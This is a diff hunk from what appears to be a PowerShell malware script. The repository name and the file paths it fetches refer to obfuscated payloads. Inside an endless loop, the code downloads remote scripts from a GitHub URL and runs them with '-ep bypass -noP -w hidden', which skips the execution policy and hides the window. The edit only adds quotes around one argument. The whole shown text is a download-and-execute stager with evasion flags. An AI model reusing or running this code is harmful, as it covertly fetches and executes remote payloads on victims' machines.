@@ -75,12 +75,12 @@ while ($true) {
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
-        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath $basePath -fwdPath $fwdPath
+        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$basePath" -fwdPath $fwdPath
     }
 
     elseif($x -or $y){
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
-        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath $basePath -fwdPath $fwdPath
+        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$basePath" -fwdPath $fwdPath
     }
     $issetup = $false
 }
